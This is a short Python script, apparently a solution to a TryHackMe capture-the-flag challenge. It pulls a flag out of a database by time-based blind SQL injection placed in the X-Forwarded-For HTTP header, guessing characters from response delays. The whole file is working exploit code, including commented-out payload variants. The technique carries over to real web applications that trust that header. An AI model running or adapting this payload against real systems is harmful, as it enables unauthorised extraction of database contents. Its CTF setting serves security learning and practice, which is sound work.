#!/usr/bin/python3
from sys import argv
import string
import requests
from time import time

# header = {"X-Forwarded-For" : "1' AND (SELECT 1 FROM (SELECT(SLEEP(10-(IF(SUBSTR((SELECT flag from flag),1,1)='T',0,10)))))bAKL)-- CYEd"}
# #header = {"X-Forwarded-For" : "1' AND (SELECT 1 FROM (SELECT(SLEEP(5-(IF(1=1)))XyZk)-- CYEd"}

def main():
	try:
		ip = argv[1]
	except :
		ip = "10.10.8.72"
		# print(f"[!] Usage: {argv[0]} <ip>")
		# exit(-1)

	
	url = f"http://{ip}/"

	flag = "THM{FLAG2:"

	hex_chars = ['A', 'B' 'C', 'D', 'E', 'F']

	char_set = ''.join(hex_chars) + string.digits + ':' + '}' 
	#print(char_set)

	print("[*] Getting the flag...")

	while '}' not in flag: 
		for char in char_set:

			pos = len(flag) + 1

			header = {"X-Forwarded-For" : f"1' AND (SELECT 1 FROM (SELECT(SLEEP(5-(IF(SUBSTR((SELECT flag from flag),{pos},1)='{char}',0,5)))))bAKL)-- CYEd"}

			start = time()
			requests.get(url, headers=header)
			end = time()
			#print(char)
			#print(r.text)

			if (end - start) > 5:
				flag += char
				print(f"flag: {flag}")
				break	


	print(f"[!] Flag: {flag}")

if __name__ == "__main__":
	main()